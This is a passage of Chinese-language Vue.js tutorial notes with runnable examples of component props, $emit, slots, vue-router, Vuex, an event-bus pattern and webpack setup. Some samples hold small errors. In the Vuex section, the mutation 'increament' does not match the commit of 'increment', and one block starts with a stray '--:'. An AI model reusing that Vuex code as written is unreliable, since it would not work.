  <script src="./lib/vue-2.4.0.js"></script>
</head>

<body>
  <div id="app">
    <!-- 父组件，可以在引用子组件的时候， 通过 属性绑定（v-bind:） 的形式, 把 需要传递给 子组件的数据，以属性绑定的形式，传递到子组件内部，供子组件使用 -->
    <com1 v-bind:parentmsg="msg"></com1>
  </div>

  <script>
    // 创建 Vue 实例，得到 ViewModel
    var vm = new Vue({
      el: '#app',
      data: {
        msg: '123 啊-父组件中的数据'
      },
      methods: {},

      components: {
        // 结论：经过演示，发现，子组件中，默认无法访问到 父组件中的 data 上的数据 和 methods 中的方法
        com1: {
          data() { // 注意： 子组件中的 data 数据，并不是通过 父组件传递过来的，而是子组件自身私有的，比如： 子组件通过 Ajax ，请求回来的数据，都可以放到 data 身上；
            // data 上的数据，都是可读可写的；
            return {
              title: '123',
              content: 'qqq'
            }
          },
          template: '<h1 @click="change">这是子组件 --- {{ parentmsg }}</h1>',
          // 注意： 组件中的 所有 props 中的数据，都是通过 父组件传递给子组件的
          // props 中的数据，都是只读的，无法重新赋值
          props: ['parentmsg'], // 把父组件传递过来的 parentmsg 属性，先在 props 数组中，定义一下，这样，才能使用这个数据
          directives: {},
          filters: {},
          components: {},
          methods: {
              //子组件更改父组件内容，虽然可以但会报错
            change() {
              this.parentmsg = '被修改了'
            }
          }
        }
      }
    });
  </script>
</body>

</html>
```
>[danger] ##### 验证案例
```
1.不是所有值都需要从父组件传递，也可以自定义传递过去
```
```
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <title>Examples</title>
    <meta name="description" content="">
    <meta name="keywords" content="">
    <link href="" rel="stylesheet">
    <script src="lib/vue.js"></script>
    <style>
        .red {
            background-color: red;
        }
    </style>
</head>
<body>
<div id="box">
    <com1 kerwinname="首页"></com1>
    <com1 kerwinname="电影页" :status="true"></com1>
</div>
<template id="dom">
    <div>
        <span>{{kerwinname}}</span>
        <button v-show="status">返回</button>
    </div>
</template>
<script type="text/javascript">

    Vue.component('com1',{
        template:'#dom',
        props:{kerwinname:String,
                status:Boolean}
    })

    var vm = new Vue({
        el:"#box",
        data:{
        },

    })
</script>
</body>
</html>
```

>[success] # 父传子方法
```
1.在子组件调用的使用使用v-on 绑定上父组件的方法
2.在子组件调用父组件使用this.$emit('func','传递的参数')，第一个参数是子组件调用时候绑定的方法名，第二个是参数
```
>[danger] ##### 写法
```
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Document</title>
    <script src="./lib/vue-2.4.0.js"></script>
</head>

<body>
<div id="app">
    <!--子组件绑定父组件方法，起的别名叫func-->
    <com2 @func="show"></com2>
</div>

<template id="tmpl">
    <div>
        <h1>这是 子组件</h1>
        <input type="button" value="这是子组件中的按钮 - 点击它，触发 父组件传递过来的 func 方法" @click="myclick">
    </div>
</template>

<script>
    var com2 = {
        template:'#tmpl',
        data:function () {
            return {

            }
        },
        methods:{
            myclick(){
                // 子组件将 调用的方法 和别名关联在一起 使用this.$emit
                this.$emit('func','传递的参数')
            }
        }
    }

    var vm = new Vue({
        el:"#app",
        data:{},
        methods:{
            show:function (args) {
                console.log("1",args)
            }
        },
        components:{
            // 使用自定义的子组件
            com2,
        }
    })

</script>
</body>

</html>
```
>[success] # 将子组件的data 给父组件
```
1.利用父传子的方法，方法传值把 子组件的data数据给父组件
```
>[danger] ##### 案例
```
<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta http-equiv="X-UA-Compatible" content="ie=edge">
  <title>Document</title>
  <script src="./lib/vue-2.4.0.js"></script>
</head>

<body>
  <div id="app">
    <!-- 父组件向子组件 传递 方法，使用的是 事件绑定机制； v-on, 当我们自定义了 一个 事件属性之后，那么，子组件就能够，通过某些方式，来调用 传递进去的 这个 方法了 -->
    <com2 @func="show"></com2>
  </div>

  <template id="tmpl">
    <div>
      <h1>这是 子组件</h1>
      <input type="button" value="这是子组件中的按钮 - 点击它，触发 父组件传递过来的 func 方法" @click="myclick">
    </div>
  </template>

  <script>

    // 定义了一个字面量类型的 组件模板对象
    var com2 = {
      template: '#tmpl', // 通过指定了一个 Id, 表示 说，要去加载 这个指定Id的 template 元素中的内容，当作 组件的HTML结构
      data() {
        return {
          sonmsg: { name: '小头儿子', age: 6 }
        }
      },
      methods: {
        myclick() {
          // 当点击子组件的按钮的时候，如何 拿到 父组件传递过来的 func 方法，并调用这个方法？？？
          //  emit 英文原意： 是触发，调用、发射的意思
          // this.$emit('func123', 123, 456)
          this.$emit('func', this.sonmsg)
        }
      }
    }


    // 创建 Vue 实例，得到 ViewModel
    var vm = new Vue({
      el: '#app',
      data: {
        datamsgFormSon: null
      },
      methods: {
        show(data) {
          // console.log('调用了父组件身上的 show 方法: --- ' + data)
          // console.log(data);
          this.datamsgFormSon = data
        }
      },

      components: {
        com2
        // com2: com2
      }
    });
  </script>
</body>

</html>
```
>[danger] ##### 案例代码
![](https://box.kancloud.cn/d535ab45e4ad9d5cb1d5ef824963bcb1_1366x445.png)
```
 <!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta http-equiv="X-UA-Compatible" content="ie=edge">
  <title>Document</title>
  <script src="./lib/vue-2.4.0.js"></script>
  <link rel="stylesheet" href="./lib/bootstrap-3.3.7.css">
</head>

<body>
  <div id="app">


    <cmt-box @func="loadComments"></cmt-box>


    <ul class="list-group">
      <li class="list-group-item" v-for="item in list" :key="item.id">
        <span class="badge">评论人： {{ item.user }}</span>
        {{ item.content }}
      </li>
    </ul>


  </div>


  <template id="tmpl">
    <div>

      <div class="form-group">
        <label>评论人：</label>
        <input type="text" class="form-control" v-model="user">
      </div>

      <div class="form-group">
        <label>评论内容：</label>
        <textarea class="form-control" v-model="content"></textarea>
      </div>

      <div class="form-group">
        <input type="button" value="发表评论" class="btn btn-primary" @click="postComment">
      </div>

    </div>
  </template>

  <script>

    var commentBox = {
      data() {
        return {
          user: '',
          content: ''
        }
      },
      template: '#tmpl',
      methods: {
        postComment() { // 发表评论的方法
          // 分析：发表评论的业务逻辑
          // 1. 评论数据存到哪里去？？？   存放到了 localStorage 中  localStorage.setItem('cmts', '')
          // 2. 先组织出一个最新的评论数据对象
          // 3. 想办法，把 第二步中，得到的评论对象，保存到 localStorage 中：
          //  3.1 localStorage 只支持存放字符串数据， 要先调用 JSON.stringify 
          //  3.2 在保存 最新的 评论数据之前，要先从 localStorage 获取到之前的评论数据（string）， 转换为 一个  数组对象， 然后，把最新的评论， push 到这个数组
          //  3.3 如果获取到的 localStorage 中的 评论字符串，为空不存在， 则  可以 返回一个 '[]'  让 JSON.parse 去转换
          //  3.4  把 最新的  评论列表数组，再次调用 JSON.stringify 转为  数组字符串，然后调用 localStorage.setItem()

          var comment = { id: Date.now(), user: this.user, content: this.content }

          // 从 localStorage 中获取所有的评论
          var list = JSON.parse(localStorage.getItem('cmts') || '[]')
          list.unshift(comment)
          // 重新保存最新的 评论数据
          localStorage.setItem('cmts', JSON.stringify(list))

          this.user = this.content = ''

          // this.loadComments() // ?????
          this.$emit('func')
        }
      }
    }

    // 创建 Vue 实例，得到 ViewModel
    var vm = new Vue({
      el: '#app',
      data: {
        list: [
          { id: Date.now(), user: '李白', content: '天生我材必有用' },
          { id: Date.now(), user: '江小白', content: '劝君更尽一杯酒' },
          { id: Date.now(), user: '小马', content: '我姓马， 风吹草低见牛羊的马' }
        ]
      },
      beforeCreate(){ // 注意：这里不能调用 loadComments 方法，因为在执行这个钩子函数的时候，data 和 methods 都还没有被初始化好

      },
      created(){
        this.loadComments()
      },
      methods: {
        loadComments() { // 从本地的 localStorage 中，加载评论列表
          var list = JSON.parse(localStorage.getItem('cmts') || '[]')
          this.list = list
        }
      },
      components: {
        'cmt-box': commentBox
      }
    });
  </script>
</body>

</html>
```
>[success] # 显示侧边栏案例
```
1.点击按钮显示侧边栏
2.点击侧边栏隐藏侧边栏
```
![](https://box.kancloud.cn/e87a5e31cf73024f3a66303b280d3474_246x163.png)
>[danger] ##### 代码
```
1.创建两个组件，两个组件关联中间值是父组件的status
2.按钮考察的是父传子方法
```
```
<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
<title>Examples</title>
<meta name="description" content="">
<meta name="keywords" content="">
<link href="" rel="stylesheet">

<script type="text/javascript" src="lib/vue.js"></script>
</head>
<body>
   
    <div id="box">
       <!-- <button @click="show=!show">父按钮</button> -->
       <!-- <navbar @kerwinevent="handleEvent">自动传数据到handleEvent</navbar> -->
       <navbar @kerwinevent="handleEvent($event)"></navbar>
       <sidebar v-show="show" @kerwinevent="show=!show"></sidebar>
    </div>

    <script type="text/javascript">
        
        var navbar = {
          template:`

            <div>
            <button @click="handleClick">click</button>
            navbar</div>
          `,

          data(){
            return {
              text:"来自子组件的问候"
            }
          },

          methods:{
            handleClick(){
              console.log("navbar click");
              //通知父组件中状态发生改变（子-传父）
              
              this.$emit("kerwinevent",this.text);
            }
          }
        }

        var sidebar = {
          template:`

            <div style="backgroundColor:black;color:white;">sidebar

                <ul @click="handleClick">
                    <li>首页</li>
                    <li>11</li>
                    <li>22</li>
                    <li>33</li>
                </ul>
            </div>
          `,

          methods:{
            handleClick(){
              // node events,  emit 分发
              this.$emit("kerwinevent");
            }
          }
        }


        var vm = new Vue({
          el:"#box",

          data:{
            show:false
          },

          methods:{
            handleEvent(data){
              console.log(data);
              this.show = !this.show;
            }
          },

          components:{
            navbar,
            sidebar
          }
        })

    </script>
</body>
</html>
```
>[success] # slot内容分发
```
1.在组件标签中间写内容，使用slot 插槽
```
>[danger] ##### 案例
```
<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
<title>Examples</title>
<meta name="description" content="">
<meta name="keywords" content="">
<link href="" rel="stylesheet">

<script type="text/javascript" src="lib/vue.js"></script>
</head>
<body>
    <div id="box">
       <hello>
          <ul slot="b">
            <li>11111</li>
          </ul>
          <ul slot="a">
            <li>222222</li>
          </ul>
       </hello>
      
    </div>
   

    <script type="text/javascript">
    	
    var hello ={
      template:`
        <div>
          hello
          <p>1111</p>
          <slot name="a"></slot>
          <p>22222</p>
          <p>33333</p>
          <p>5555</p>
          <slot name="b"></slot>
        </div>
      `
    }
       new Vue({
        el:"#box",
        data:{
          isShow:true
        },
        components:{
          hello
        }
       })
    </script>
</body>
</html>
```
>[success] # 创建动态组件
```
<component> 元素，动态地绑定多个组件到它的 is 属性
<keep-alive> 保留状态，避免重新渲染
```
>[danger] ##### 根据组件名动态切换组件
```
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    <title>Examples</title>
    <meta name="description" content="">
    <meta name="keywords" content="">
    <link href="" rel="stylesheet">
    <script src="lib/vue.js"></script>
    <style>
        * {
            margin: 0px;
            padding: 0px;
        }

        html, body {
            width: 100%;
            height: 100%;
        }

        footer ul {
            display: flex;
            position: fixed;
            bottom: 0;
            left: 0;
            width: 100%;
            height: 40px;
        }

        ul li {
            flex: 1;
            text-align: center;
            list-style: none;
            height: 40px;
            line-height: 40px;
            background: gray;
        }
    </style>
</head>
<body>
<div id="app">
    <keep-alive>
        <component :is="who"></component>
    </keep-alive>
    <footer>
        <ul>
            <li><a @click="who='first'">首页</a></li>
            <li><a @click="who='second'">中间页</a></li>
            <li><a @click="who='third'">尾页</a></li>
        </ul>
    </footer>
</div>

<template id="first">
    <div>
        首页<input>
    </div>
</template>


<template id="second">
    <div>
        中间页
    </div>
</template>

<template id="third">
    <div>
        尾页
    </div>
</template>


<script type="text/javascript">

    var first = {
        template: "#first",
        methods: {}
    }

    var second = {
        template: "#second",
        methods: {}
    }
    var third = {
        template: "#third",
        methods: {}
    }
    var vm = new Vue({
        el: "#app",
        data: {
            who: 'first'
        },
        components: {
            first,
            second,
            third,
        }

    })
</script>
</body>
</html>
```
>[success] # 使用函数render 创建组件
```
1.和temple类似都是动态生成html，区别在于temple ，还需要vue做处理，才能显示页面，而render 更偏向编译

2.类似v-text 会将整个内容替换，render 所替换的内容是整个，绑定内容框
```
>[danger] ##### 代码
```
1.render 中第一个参数是用来创建html的函数
2.必须返回创建的模板
3.下面案例在id 是app标签下嵌套的p标签也会因为使用了render，导致整体被覆盖掉不显示，自动到对应的el 绑定下标签显示内容
```
```
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Document</title>
    <script src="./lib/vue-2.4.0.js"></script>
</head>

<body>
<div id="app">
    <p>444444</p>
</div>

<script>

    var login = {
        template: '<h1>这是登录组件</h1>'
    }

    // 创建 Vue 实例，得到 ViewModel
    var vm = new Vue({
        el: '#app',
        data: {},
        methods: {},
        render: function (createElements) { // createElements 是一个 方法，调用它，能够把 指定的 组件模板，渲染为 html 结构
            return createElements(login)
            // 注意：这里 return 的结果，会 替换页面中 el 指定的那个 容器
        }
    });
</script>
</body>

</html>
```
>[success] # Vue 的路由映射
* 后台路由
```
1.后台路由是每一次请求，服务器经过服务器渲染产生的路由映射
```
* 前端路由
```
1.前端路由的一种就是利用hash进行路由跳转，当路由中的url 带有# 就不会请求后
台服务器，进行页面跳转
2.在单页面应用程序中，这种通过hash改变来切换页面的方式，称作前端路由（区别
于后端路由）
```
>[success] # 在 vue前端路由 中使用 vue-router
```
1.vue中就提供了类似前端路由的方式，引入vue-router 组件库就可以使用路由
```
>[danger] ##### 简单使用vue-router 
![](https://box.kancloud.cn/dc5870d1933d07392f79a0f3905a74f2_188x120.png)
```
1.导入前端路由的组件类库 vue-router
2.创建组件的模板对象
3.创建vue-router 组件类库的对象 -- var router = new VueRouter({})
4.将vue创建对象的router属性和路由对象绑定
5.在页面直接使用 <router-view></router-view>
 标签调用
```
* 几个属性说明
```
1.当我们绑定路由后，可以编写a标签进行路由跳转，也可以使用router自带的标签    
<router-link to="/login" tag="span">登录</router-link>
，to是跳转的连接，默认是a标签可以使用tag 更改默认标签
2. <router-view></router-view> 加载整个路由标签
3.  var routerObj = new VueRouter({})创建的路由对象中有一个routes 数组，里面
是根据对象的形式存放地址和对应的组件，也可以进行重定向
4.在创建的Vue对象中要引入router 属性将路由和vue进行关联

```
* 案例切换 登陆注册
```
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Document</title>
    <script src="./lib/vue-2.4.0.js"></script>
    <script src="./lib/vue-router-3.0.1.js"></script>

    <link rel="stylesheet" href="./lib/bootstrap-3.3.7.css">

</head>

<body>

<div id="app">

     <!--<a href="#/login">登录</a>-->
     <!--<a href="#/register">注册</a>-->
    <!-- router-link 默认渲染为一个a 标签 -->
    <router-link to="/login" tag="span">登录</router-link>
    <router-link to="/register">注册</router-link>
    <router-view></router-view>

</div>

<script>

    // 创建 关联组件
    var login = {
        template:'<h1>登陆组件</h1>'
    }

    var register = {
        template:'<h1>注册的组件</h1>'
    }

    // 创建一个路由对象
    var routerObj = new VueRouter({
        // routes 这个配置对象负责路由匹配的
        routes: [ // 路由匹配规则
            // 每个路由规则，都是一个对象，这个规则对象，身上，有两个必须的属性：
            //  属性1 是 path， 表示监听 哪个路由链接地址；
            //  属性2 是 component， 表示，如果 路由是前面匹配到的 path ，则展示 component 属性对应的那个组件
            // 注意： component 的属性值，必须是一个 组件的模板对象， 不能是 组件的引用名称；
            // { path: '/', component: login },
            { path: '/', redirect: '/login' }, // 这里的 redirect 和 Node 中的 redirect 完全是两码事
            { path: '/login', component: login },
            { path: '/register', component: register }
        ]
    })

    // 创建 Vue 实例，得到 ViewModel
    var vm = new Vue({
        el: '#app',
        data: {},
        methods: {},
        router: routerObj // 将路由规则对象，注册到 vm 实例上，用来监听 URL 地址的变化，然后展示对应的组件
    });
</script>
</body>

</html>
```
>[success] # Vue 路由映射样式
```
1.当我们想 更改跳转路由映射的按钮的样式，也就是说想router-link增加样式
，router-link自带样式class  router-link-active，只要给这个class 增加样式即可
2.方法二在创建的路由对象中使用linkActiveClass 添加一个默认类名
```
>[danger] ##### 编写高亮动画效果
![](https://box.kancloud.cn/d3eeaa23905dc17d26484812e7369814_367x222.png)
```
<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta http-equiv="X-UA-Compatible" content="ie=edge">
  <title>Document</title>
  <script src="./lib/vue-2.4.0.js"></script>
  <!-- 1. 安装 vue-router 路由模块 -->
  <script src="./lib/vue-router-3.0.1.js"></script>
  <style>
    .router-link-active,
    .myactive {
      color: red;
      font-weight: 800;
      font-style: italic;
      font-size: 80px;
      text-decoration: underline;
      background-color: green;
    }

    .v-enter,
    .v-leave-to {
      opacity: 0;
      transform: translateX(140px);
    }

    .v-enter-active,
    .v-leave-active {
      transition: all 0.5s ease;
    }
  </style>
</head>

<body>
  <div id="app">

    <!-- <a href="#/login">登录</a> -->
    <!-- <a href="#/register">注册</a> -->

    <!-- router-link 默认渲染为一个a 标签 -->
    <router-link to="/login" tag="span">登录</router-link>
    <router-link to="/register">注册</router-link>


    <!-- 这是 vue-router 提供的元素，专门用来 当作占位符的，将来，路由规则，匹配到的组件，就会展示到这个 router-view 中去 -->
    <!-- 所以： 我们可以把 router-view 认为是一个占位符 -->
    <transition mode="out-in">
      <router-view></router-view>
    </transition>

  </div>

  <script>
    // 组件的模板对象
    var login = {
      template: '<h1>登录组件</h1>'
    }

    var register = {
      template: '<h1>注册组件</h1>'
    }


    /*  Vue.component('login', {
       template: '<h1>登录组件</h1>'
     }) */

    // 2. 创建一个路由对象， 当 导入 vue-router 包之后，在 window 全局对象中，就有了一个 路由的构造函数，叫做 VueRouter
    // 在 new 路由对象的时候，可以为 构造函数，传递一个配置对象
    var routerObj = new VueRouter({
      // route // 这个配置对象中的 route 表示 【路由匹配规则】 的意思
      routes: [ // 路由匹配规则 
        // 每个路由规则，都是一个对象，这个规则对象，身上，有两个必须的属性：
        //  属性1 是 path， 表示监听 哪个路由链接地址；
        //  属性2 是 component， 表示，如果 路由是前面匹配到的 path ，则展示 component 属性对应的那个组件
        // 注意： component 的属性值，必须是一个 组件的模板对象， 不能是 组件的引用名称；
        // { path: '/', component: login },
        { path: '/', redirect: '/login' }, // 这里的 redirect 和 Node 中的 redirect 完全是两码事
        { path: '/login', component: login },
        { path: '/register', component: register }
      ],
      linkActiveClass: 'myactive'
    })

    // 创建 Vue 实例，得到 ViewModel
    var vm = new Vue({
      el: '#app',
      data: {},
      methods: {},
      router: routerObj // 将路由规则对象，注册到 vm 实例上，用来监听 URL 地址的变化，然后展示对应的组件
    });
  </script>
</body>

</html>
```
[TOC]

 
>[success] # 获取路由参数
```
1.利用$route.query属性获取连接上的参数，url参数使用?形式
2.利用$route.params 获取参数，url形式是/参数的形式
```
>[danger] ##### 第一种利用 -- $route.query 获取
```
  <script src="./lib/vue-2.4.0.js"></script>
  <script src="./lib/vue-router-3.0.1.js"></script>
</head>

<body>
  <div id="app">

    <!-- 如果在路由中，使用 查询字符串，给路由传递参数，则 不需要修改 路由规则的 path 属性 -->
    <router-link to="/login?id=10&name=zs">登录</router-link>
    <router-link to="/register">注册</router-link>

    <router-view></router-view>

  </div>

  <script>

    var login = {
      template: '<h1>登录 --- {{ $route.query.id }} --- {{ $route.query.name }}</h1>',
      data(){
        return {
          msg: '123'
        }
      },
      created(){ // 组件的生命周期钩子函数
        // console.log(this.$route)
        // console.log(this.$route.query.id)
      }
    }

    var register = {
      template: '<h1>注册</h1>'
    }

    var router = new VueRouter({
      routes: [
        { path: '/login', component: login },
        { path: '/register', component: register }
      ]
    })

    // 创建 Vue 实例，得到 ViewModel
    var vm = new Vue({
      el: '#app',
      data: {},
      methods: {},
      // router: router
      router
    });
  </script>
</body>

</html>
```
>[danger] ##### 第二种 --- $route.params
```
<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta http-equiv="X-UA-Compatible" content="ie=edge">
  <title>Document</title>
  <script src="./lib/vue-2.4.0.js"></script>
  <script src="./lib/vue-router-3.0.1.js"></script>
</head>

<body>
  <div id="app">

    <!-- 如果在路由中，使用 查询字符串，给路由传递参数，则 不需要修改 路由规则的 path 属性 -->
    <router-link to="/login/12/ls">登录</router-link>
    <router-link to="/register">注册</router-link>

    <router-view></router-view>

  </div>

  <script>

    var login = {
      template: '<h1>登录 --- {{ $route.params.id }} --- {{ $route.params.name }}</h1>',
      data(){
        return {
          msg: '123'
        }
      },
      created(){ // 组件的生命周期钩子函数
        console.log(this.$route.params.id)
      }
    }

    var register = {
      template: '<h1>注册</h1>'
    }

    var router = new VueRouter({
      routes: [
        { path: '/login/:id/:name', component: login },
        { path: '/register', component: register }
      ]
    })

    // 创建 Vue 实例，得到 ViewModel
    var vm = new Vue({
      el: '#app',
      data: {},
      methods: {},
      // router: router
      router
    });
  </script>
</body>

</html>
```
>[success] # VUE 的路由嵌套
```
1.嵌套的时候在路由对象中增加children对象，负责嵌套路由创建的路由对象
children属性实现
```
>[danger] ##### 案例
```
<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta http-equiv="X-UA-Compatible" content="ie=edge">
  <title>Document</title>
  <script src="./lib/vue-2.4.0.js"></script>
  <script src="./lib/vue-router-3.0.1.js"></script>
</head>

<body>
  <div id="app">

    <router-link to="/account">Account</router-link>

    <router-view></router-view>

  </div>

  <template id="tmpl">
    <div>
      <h1>这是 Account 组件</h1>

      <router-link to="/account/login">登录</router-link>
      <router-link to="/account/register">注册</router-link>

      <router-view></router-view>
    </div>
  </template>

  <script>

    // 组件的模板对象
    var account = {
      template: '#tmpl'
    }

    var login = {
      template: '<h3>登录</h3>'
    }

    var register = {
      template: '<h3>注册</h3>'
    }

    var router = new VueRouter({
      routes: [
        {
          path: '/account',
          component: account,
          // 使用 children 属性，实现子路由，同时，子路由的 path 前面，不要带 / ，否则永远以根路径开始请求，这样不方便我们用户去理解URL地址
          children: [
            { path: 'login', component: login },
            { path: 'register', component: register }
          ]
        }
        // { path: '/account/login', component: login },
        // { path: '/account/register', component: register }
      ]
    })

    // 创建 Vue 实例，得到 ViewModel
    var vm = new Vue({
      el: '#app',
      data: {},
      methods: {},
      router
    });
  </script>
</body>

</html>
```
>[success] # 命名视图
```
1.一个页面放置多个视图
2.视图对象连接对应多个组件形成一个页面多个视图组件
```
>[danger] ##### 经典布局
![](https://box.kancloud.cn/391dcbef13c177756f4865f5063a366c_1348x630.png)
```
--: <!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta http-equiv="X-UA-Compatible" content="ie=edge">
  <title>Document</title>
  <script src="./lib/vue-2.4.0.js"></script>
  <script src="./lib/vue-router-3.0.1.js"></script>
  <style>
    html,
    body {
      margin: 0;
      padding: 0;
    }

    .header {
      background-color: orange;
      height: 80px;
    }

    h1 {
      margin: 0;
      padding: 0;
      font-size: 16px;
    }

    .container {
      display: flex;
      height: 600px;
    }

    .left {
      background-color: lightgreen;
      flex: 2;
    }

    .main {
      background-color: lightpink;
      flex: 8;
    }
  </style>
</head>

<body>
  <div id="app">

    <router-view></router-view>
    <div class="container">
      <router-view name="left"></router-view>
      <router-view name="main"></router-view>
    </div>

  </div>

  <script>

    var header = {
      template: '<h1 class="header">Header头部区域</h1>'
    }

    var leftBox = {
      template: '<h1 class="left">Left侧边栏区域</h1>'
    }

    var mainBox = {
      template: '<h1 class="main">mainBox主体区域</h1>'
    }

    // 创建路由对象
    var router = new VueRouter({
      routes: [
        /* { path: '/', component: header },
        { path: '/left', component: leftBox },
        { path: '/main', component: mainBox } */


        {
          path: '/', components: {
            'default': header,
            'left': leftBox,
            'main': mainBox
          }
        }
      ]
    })

    // 创建 Vue 实例，得到 ViewModel
    var vm = new Vue({
      el: '#app',
      data: {},
      methods: {},
      router
    });
  </script>
</body>

</html>
```
>[success] # Vuex
```
1.vuex 是为了保护组件之间共享数据而诞生的，如果组价之间的数据，可以直接
挂在到vuex中，而不是通过父子组件之间传值，如果此时数据需要共享可以使用vuex
2.vuex 是存放共享数据，props是存放父子组件，vuex是组件和组件直接
```
>[danger] #####  创建vuex
```
1. npm install vuex --save
 // 安装
2. import Vuex from 'vuex'
3.Vue.use(Vuex)
4.var store = new Vuex.Store({
        state:{},
        mutations:{},
        getters:{},
    })
5.对上面数据的讲解 ，这个对应java思想，操作属性的时候不直接操作，通
过间接操作实现
    + state用来存储公共数据的对象，在组件中想使用state 中的对象this.$store.state.属性名访问
    + mutations 用来操作state 对象中的公共数据，类似java setter，在组件中想使用mutations 对象this.$store.commit('方法名')
    + getters 用来使用数据的类似java getter，在组件中想使用getter对象$store.getters.属性名
```
```
// 配置入口文件
import Vue from 'vue'
// 第一步 导入vuex 包
import Vuex from 'vuex'

//第二步 将vuex 注册到Vue 组件中
Vue.use(Vuex)

// 第三步 创建一个 vuex组件
// state 用来保存公共的data数据,当在组件中调用的时候通过 this.$store.state.属性名访问
var store = new Vuex.Store({
    state:{
      count:0,
    },
    // 组件操作，vuex 公共数据的时候，要在调用 mutations 提供的方法，才能操作对应的数据，
    // 不推荐直接操作 state 中的数据，因为 万一导致了数据的紊乱，不能快速定位到错误的原因，
    // 因为，每个组件都可能有操作数据的方法；
    mutations:{
        // 自定义一个操作state中数据的方法
        // 注意： 如果组件想要调用 mutations 中的方法，只能使用 this.$store.commit('方法名')
        // 这种 调用 mutations 方法的格式，和 this.$emit('父组件中方法名')
        increament(state){
          state.count ++
        },
        subtract(state, obj) {
            // 注意： mutations 的 函数参数列表中，最多支持两个参数，其中，参数1： 是 state 状态； 参数2： 通过 commit 提交过来的参数；
            console.log(obj)
            state.count -= (obj.c + obj.d)
        }
    },
    // 使用数据在getters对象中操作
    getters: {
        // 注意：这里的 getters， 只负责 对外提供数据，不负责 修改数据，如果想要修改 state 中的数据，请 去找 mutations
        optCount: function (state) {
            return '当前最新的count值是：' + state.count
        }
        // 其次， getters 也和 computed 比较像， 只要 state 中的数据发生变化了，那么，如果 getters 正好也引用了这个数据，那么 就会立即触发 getters 的重新求值；
    }

})

import App from './App.vue'

const vm = new Vue({
    el: '#app',
    render: c => c(App),
    store // 5. 将 vuex 创建的 store 挂载到 VM 实例上， 只要挂载到了 vm 上，任何组件都能使用 store 来存取数据
})
```
* 组件中使用
```
<template>
  <div>
    <input type="button" value="减少" @click="remove">
    <input type="button" value="增加" @click="add">
    <br>
    <input type="text" v-model="$store.state.count">
  </div>
</template>

<script>
export default {
  data() {
    return {
      // count: 0
    };
  },
  methods: {
    add() {
      // 千万不要这么用，不符合 vuex 的设计理念
      // this.$store.state.count++;
      this.$store.commit("increment");
    },
    remove() {
      this.$store.commit("subtract", { c: 3, d: 1 });
    }
  },
  computed:{
    fullname: {
      get(){},
      set(){}
    }
  }
};
</script>

<style lang="scss" scoped>

</style>

```
```
<template>
  <div>
    <!-- <h3>{{ $store.state.count }}</h3> -->
    <h3>{{ $store.getters.optCount }}</h3>
    
  </div>
</template>

<script>
</script>

<style lang="scss" scoped>

</style>

```
>[success] ##### 创建vue 实例bus，兄弟间传值
```
使用 $on(eventName) 监听事件
使用 $emit(eventName) 触发事件
```
>[danger] ##### 案例
```
<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
<title>Examples</title>
<meta name="description" content="">
<meta name="keywords" content="">
<link href="" rel="stylesheet">

<script type="text/javascript" src="lib/vue.js"></script>
</head>
<body>
    <div id="box">
       
        <child1></child1>
        <child2></child2>
    </div>
   

    <script type="text/javascript">

       var bus = new Vue();//空vue实例


       var child1 = {
        template:`

          <div>child1

              <button @click="handleClick()">click</button>
          </div>
        `,

        data(){
          return {
            text:"来自child1的问候"
          }
        },

        methods:{
          handleClick(){
            //传text 给 child2.
            //
             bus.$emit("kerwin",this.text);
          }
        }
       }

       var child2 = {
        template:`

          <div>{{innerHTML}}</div>
        `,
        data(){ 
          return {
            innerHTML : "child2"
          }
        },

        mounted(){
          //组件加载完成 这个方法会被调用，
          console.log("child2 mounted");

          //监听事件， ajax ，
        
          bus.$on("kerwin",(data)=>{
            this.innerHTML = data;
          })
        }
       }

      // vm.$mount("#box")

      new Vue({
        el:"#box",
        components:{
          child1,
          child2
        }
      })
   
    </script>
</body>
</html>
```
[TOC]

 
>[success] # webpack
```
1.webpack 是前端的一个项目构建工具，它是基于 Node.js 开发出来的一个前
端工具；
```
>[danger] ##### webpack安装的两种方式



```
1.运行npm i webpack -g全局安装webpack，这样就能在全局使用webpack的命令

2.在项目根目录中运行npm i webpack --save-dev安装到项目依赖中
```
* 在webpack4中还需安装下面这个
```
1.npm i webpack-cli -g 如果 webpack 安装在全局，那么 CLI 也需要装在全局
```
>[danger] ##### 安装后打包指令 -- 简易方法
```
1.webpack ./src/index.js ./dist/bundle.js 第一路径是要被打包文件的路径，第二个是打包位置，这个方法支持 webpack3
```
>[danger] ##### 配置文件打包 -- webpack.config.js
```
1.在项目根目录中创建webpack.config.js

